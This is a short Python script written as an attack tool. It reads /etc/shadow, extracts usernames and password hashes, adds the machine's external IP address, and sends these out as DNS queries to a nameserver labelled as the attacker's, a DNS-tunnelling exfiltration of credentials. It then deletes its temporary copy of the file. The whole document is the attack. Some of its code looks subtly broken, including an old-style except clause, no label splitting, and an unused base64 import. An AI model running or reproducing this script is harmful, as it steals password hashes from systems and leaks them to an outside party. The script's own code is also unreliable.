import subprocess
import dns.resolver
import socket
import base64
from requests import get

ATTACKERS_DNS_SERVER = '10.0.0.25'

# get external ip address
external_ip = get('https://api.ipify.org').text

resolver = dns.resolver.Resolver()
resolver.nameservers = [socket.gethostbyname(ATTACKERS_DNS_SERVER)]
# only done this way because im too careful with passwords

# copy shadow file for processing
subprocess.call(['cp /etc/shadow /tmp/shadow_c'], shell=True)

# get contents of shadow file
with open('/tmp/shadow_c', 'r') as shadow_content:
    for shadow_line in shadow_content.readlines():

        shadow_line_tokens = shadow_line.split(':')

        hashed_password = shadow_line_tokens[1]
        username = shadow_line_tokens[0]

        if hashed_password not in ['*', '!']:
            # construct DNS query for tunneling
            query = '{}{}{}'.format(username, hashed_password, external_ip)


            try:
                sent_query = resolver.query(query, 'NS')  # maybe 'Type A'
            except dns.resolver.NXDOMAIN, dns.name.LabelTooLong:
                pass

# remove copied shadow file
subprocess.call(['rm /tmp/shadow_c'], shell=True)
